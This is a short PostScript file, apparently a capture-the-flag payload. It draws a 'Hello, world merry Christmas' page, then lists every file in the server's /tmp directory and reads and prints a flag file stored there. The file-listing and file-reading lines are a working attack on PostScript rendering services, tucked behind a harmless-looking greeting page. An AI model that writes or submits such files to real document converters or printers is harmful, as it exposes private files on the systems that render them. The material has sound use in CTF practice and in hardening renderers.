%!PS
/newfont /Helvetica findfont 12 scalefont setfont
100 700 moveto
(Hello, world merry Christmas) show
showpage
(/tmp/*) { = } 1024 string filenameforall
(/tmp/flag-9fb215456edeadc855c755846be83cc310a5d262aa5d9360dd27db9cd0141a9d.txt) (r) file 1024 string readstring pop =